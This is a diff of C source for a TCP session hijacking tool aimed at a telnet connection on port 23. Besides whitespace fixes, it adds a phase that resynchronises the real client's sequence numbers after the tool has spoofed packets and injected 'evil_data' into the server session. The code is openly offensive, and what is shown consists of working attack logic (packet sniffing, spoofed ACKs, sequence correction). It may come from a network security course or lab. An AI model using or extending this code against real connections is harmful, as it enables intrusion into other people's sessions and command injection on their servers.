@@ -130,7 +130,7 @@ void main(int argc, char *argv[]) {  // @params: client IP, client port, server 
 			else ++count;
 		}
 	};
-	if (count!=PERSONAL_TOUCH) { printf("Phase 2 unsuccesfully ended.\n"); exit(0); }
+	if (count != PERSONAL_TOUCH) { printf("Phase 2 unsuccesfully ended.\n"); exit(0); }
 	printf("  Server SEQ: %X (hex)    ACK: %X (hex)\n", serv_seq, serv_ack);
 	printf("Phase 2 ended.\n");
 
@@ -148,7 +148,7 @@ void main(int argc, char *argv[]) {  // @params: client IP, client port, server 
 		/* 2. Wait for ack packet from server */
 		wait_packet(fd_receive, &attack_info, SERVER, 23, CLIENT, CLIENT_P, ACK, 0);
 		/* 3. The ack number matches the evil packet, success */
-		if (attack_info.ack == serv_ack  +sizeof(evil_data)) count = PERSONAL_TOUCH;
+		if (attack_info.ack == serv_ack + sizeof(evil_data)) count = PERSONAL_TOUCH;
 		else ++count;
 	};
 	if(count != PERSONAL_TOUCH) { printf("Phase 3 unsuccesfully ended.\n"); exit(0); }
@@ -158,11 +158,17 @@ void main(int argc, char *argv[]) {  // @params: client IP, client port, server 
 	 * phase 4: restore connection of the true client
 	 */
 	printf("\nTakeover phase 4: Restoring connection.\n");
+    serv_ack += sizeof(evil_data);  // correct seq to be sent from client to server
+    do {
+        /* 1. Wait for packet from client*/
+        wait_packet(fd_receive, &attack_info, CLIENT, CLIENT_P, SERVER, 23, PSH, 0);
+        /* 2. Get seq and ack */
+        sp_seq = attack_info.seq;
+        sp_ack = attack_info.ack;
+        printf("  Client seq: %x, ack: %x\n", sp_seq, sp_ack);
+        /* 3. Send ack to client to correct its seq by datalen */
+        transmit_TCP(fd_send, "", 0, 0, 0,
+            SERVER, 23, CLIENT, CLIENT_P, sp_ack, sp_seq + attack_info.datalen, ACK);
+    } while (sp_seq < serv_ack - 1);  // repeat until the seq is correct
+	printf("Phase 4 ended.\n");
 }
-
-
-
-
-
-
-
